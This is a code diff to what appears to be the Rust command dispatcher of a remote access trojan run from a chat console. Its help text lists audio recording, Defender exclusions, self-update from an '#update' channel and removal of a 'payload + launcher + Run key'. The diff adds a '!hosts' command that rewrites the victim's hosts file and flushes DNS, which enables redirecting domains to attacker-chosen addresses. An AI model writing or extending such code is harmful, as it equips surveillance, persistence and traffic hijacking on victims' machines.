@@ -53,6 +53,7 @@ const HELP: &str = "\
 !audio [secs]              record system audio (speaker loopback)
 !open <url>                open a URL in the default browser
 !defender [add|remove <p>] Defender status / exclusions
+!hosts [add <ip> <dom>|remove <dom>|clear]  edit the hosts file (+DNS flush)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -461,6 +462,35 @@ pub async fn dispatch(
             } else {
                 host::open_url(&arg);
                 st.send(console, "opened").await?;
+            }
+        }
+        "hosts" => {
+            let a = arg.trim();
+            if a.is_empty() {
+                let r = tokio::task::spawn_blocking(host::hosts_show).await?;
+                st.send_code(console, &r).await?;
+            } else if let Some(rest) = a.strip_prefix("add ") {
+                let mut it = rest.split_whitespace();
+                let ip = it.next().unwrap_or("");
+                let dom = it.next().unwrap_or("");
+                if ip.is_empty() || dom.is_empty() {
+                    st.send(console, "usage: !hosts add <ip> <domain>").await?;
+                } else {
+                    let r = host::hosts_add(ip, dom)?;
+                    st.send(console, &r).await?;
+                }
+            } else if let Some(rest) = a.strip_prefix("remove ") {
+                let r = host::hosts_remove(rest.trim())?;
+                st.send(console, &r).await?;
+            } else if a.eq_ignore_ascii_case("clear") {
+                let r = host::hosts_clear()?;
+                st.send(console, &r).await?;
+            } else {
+                st.send(
+                    console,
+                    "usage: !hosts [add <ip> <domain> | remove <domain> | clear]",
+                )
+                .await?;
             }
         }
         "defender" => {
